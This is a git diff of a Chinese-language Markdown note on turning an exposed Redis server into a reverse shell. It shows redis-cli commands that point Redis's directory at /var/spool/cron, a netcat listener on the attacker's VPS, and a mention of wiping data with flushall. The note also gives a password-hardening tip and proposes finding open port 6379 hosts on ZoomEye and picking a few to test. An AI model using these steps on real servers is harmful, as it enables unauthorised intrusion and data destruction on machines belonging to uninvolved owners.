@@ -17,8 +17,9 @@
 ```
 ### 　利用redis 反弹shell
 
+
+#### １　redis 非root 启动无权限　
 ```
-１　redis 非root 启动无权限　
 这时候最多搞点数据破坏　flushall 
 对其他操作基本上没有权限
 dh@dh-pc ~ $ redis-cli -h 192.168.1.30 config set dir /var/spool/cron
@@ -26,8 +27,10 @@ dh@dh-pc ~ $ redis-cli -h 192.168.1.30 config set dir /var/spool/cron
 dh@dh-pc ~ $ redis-cli -h 192.168.1.30
 192.168.1.30:6379> config set dir /var/spool/cron
 (error) ERR Changing directory: Permission denied
+```
 
-- 2	redis root 启动有权限（centos 系列会反弹成功，debian 系列不会成功）
+#### 2	redis root 启动有权限（centos 系列会反弹成功，debian 系列不会成功）
+```
 登陆vps:  nc -lvvp 22222 
 开始操作
 redis-cli -h 192.168.1.30 -p 6379 config set dir /var/spool/cron
@@ -65,9 +68,12 @@ cp -vf /data0/redis/6379/data/6379-dump.rdb  /data0/redis/6379/redis_backup/$(da
 sudo -u redis  /usr/bin/redis-server /data0/redis/6379/conf/redis-6379.conf
 5 为redis 配置安全密码
 在redis.conf 中配置requirepass mypassword
+```
 
 ## 4 额外测试
-- 打开　https://www.zoomeye.org port:6379
+
+```
+打开　https://www.zoomeye.org port:6379
 https://www.zoomeye.org/search?q=port%3A6379&t=host
 查看到开放6379 端口的ip
 随便抓几个测试
